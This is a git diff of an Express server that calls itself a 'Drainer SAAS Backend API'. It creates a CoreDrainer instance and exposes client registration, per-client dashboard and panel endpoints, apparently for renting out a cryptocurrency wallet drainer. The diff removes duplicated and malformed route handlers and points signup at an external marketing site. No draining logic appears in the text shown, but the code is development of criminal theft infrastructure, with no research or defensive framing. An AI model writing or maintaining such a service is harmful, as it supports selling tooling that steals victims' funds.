@@ -41,7 +41,6 @@ app.use(adminAuth);
 
 const coreDrainer = new CoreDrainer();
 
-
 // Main marketing website
 app.get("/", (req, res) => {
   res.json({
@@ -60,66 +59,6 @@ app.get("/", (req, res) => {
 
 app.get("/signup", (req, res) => {
   res.redirect("https://service-cheetah.netlify.app/");
-});
-  res.json({
-    message: "Drainer SAAS Backend API",
-    status: "running", 
-    timestamp: new Date().toISOString(),
-    endpoints: {
-      register: "POST /saas/v2/register",
-      dashboard: "GET /saas/dashboard/:clientId",
-      panel: "GET /panel",
-      health: "GET /health"
-    },
-    marketing: "https://service-cheetah.netlify.app/"
-  });
-});
-app.get("/", (req, res) => {
-  res.json({
-    message: "Drainer SAAS Backend API",
-    status: "running", 
-    timestamp: new Date().toISOString(),
-    endpoints: {
-      register: "POST /saas/v2/register",
-      dashboard: "GET /saas/dashboard/:clientId",
-      panel: "GET /panel",
-      health: "GET /health"
-    },
-    marketing: "https://service-cheetah.netlify.app/"
-  });
-});
-app.get("/", (req, res) => {
-  res.json({
-    message: "Drainer SAAS Backend API",
-    status: "running", 
-    timestamp: new Date().toISOString(),
-    endpoints: {
-      register: "POST /saas/v2/register",
-      dashboard: "GET /saas/dashboard/:clientId",
-      panel: "GET /panel",
-      health: "GET /health"
-    },
-    marketing: "https://service-cheetah.netlify.app/"
-  });
-});
-app.get("/", (req, res) => {
-  res.json({
-    message: "Drainer SAAS Backend API",
-    status: "running", 
-    timestamp: new Date().toISOString(),
-    endpoints: {
-      register: "POST /saas/v2/register",
-      dashboard: "GET /saas/dashboard/:clientId",
-      panel: "GET /panel",
-      health: "GET /health"
-    },
-    marketing: "https://service-cheetah.netlify.app/"
-  });
-});
-// Client registration page
-app.get('/signup', (req, res) => {
-  const marketingSite = generateMarketingSite();
-  res.send(marketingSite);
 });
 
 // ==================== SAAS CLIENT MANAGEMENT ====================
